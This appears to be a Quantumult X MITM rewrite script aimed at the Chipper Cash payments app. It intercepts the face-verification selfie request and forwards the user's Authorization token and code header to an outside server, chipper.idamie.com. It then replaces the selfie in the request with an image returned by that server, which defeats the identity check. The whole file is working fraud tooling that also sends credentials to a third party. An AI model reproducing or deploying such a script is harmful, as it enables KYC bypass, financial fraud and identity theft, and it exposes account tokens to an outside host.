/*
[Script]
# 替换 selfie 的请求体
^https:\/\/compliance\.chippercash\.com\/face-verification\/selfie_challenge$ script-request-body https://raw.githubusercontent.com/chucyfunny/chippertest/main/face.js

[MITM]
hostname = compliance.chippercash.com
*/

const url = 'https://chipper.idamie.com/api/v1/upload/selfie_image';

// 获取请求体和请求头信息
const request = $request;
const originalBody = JSON.parse(request.body || '{}');
const token = request.headers['Authorization'] || '';
const code = request.headers['code'] || '';

// 检查是否获取到 token 和 code
if (!token || !code) {
  $notify('Error', 'Missing token or code', 'Authorization or code header not found.');
  console.log('Missing token or code. Request headers:', JSON.stringify(request.headers));
  $done({});  // 放行请求
} else {
  console.log('Token and code found:', token, code);

  // 准备发送到服务器的 POST 请求
  const headers = {
    'Content-Type': 'application/json',
    'Authorization': token,
    'code': code
  };

  const options = {
    url: url,
    method: "POST",
    headers: headers,
    body: JSON.stringify({})
  };

  console.log('Sending POST request to server with headers:', JSON.stringify(headers));

  // 发送 POST 请求到服务器以获取 selfie 替换数据
  $task.fetch(options).then(response => {
    console.log('Received response from server:', response.statusCode, response.body);

    try {
      const jsonData = JSON.parse(response.body);

      if (jsonData.data) {
        // 获取服务器返回的 base64 编码的 selfie 数据
        const base64Data = jsonData.data;
        console.log('Base64 data received:', base64Data);

        // 检查是否成功解析原始请求体
        if (originalBody.selfie !== undefined) {
          console.log('Original selfie value:', originalBody.selfie);

          // 替换请求体中的 selfie 字段
          originalBody.selfie = base64Data;

          console.log('Modified request body:', JSON.stringify(originalBody));

          // 返回修改后的请求体
          $done({body: JSON.stringify(originalBody)});
        } else {
          $notify('Error', 'Selfie field not found in request body', 'Original request body: ' + JSON.stringify(originalBody));
          console.log('Selfie field not found in request body:', JSON.stringify(originalBody));
          $done({});
        }
      } else if (jsonData.error) {
        // 如果服务器返回错误信息，通知用户
        $notify('Error', 'Server Error', jsonData.error);
        console.log('Server returned an error:', jsonData.error);
        $done({});
      } else {
        $notify('Unexpected Response', 'The server response did not contain expected data.', '');
        console.log('Unexpected server response:', response.body);
        $done({});
      }
    } catch (e) {
      // 处理 JSON 解析错误
      $notify('Response Error', 'Failed to parse the server response', e.message);
      console.log('Failed to parse server response:', e.message);
      $done({});
    }
  }, reason => {
    // 处理请求发送错误
    $notify('Request Error', 'Failed to send request to server', reason.error);
    console.log('Failed to send request to server:', reason.error);
    $done({});
  });
}
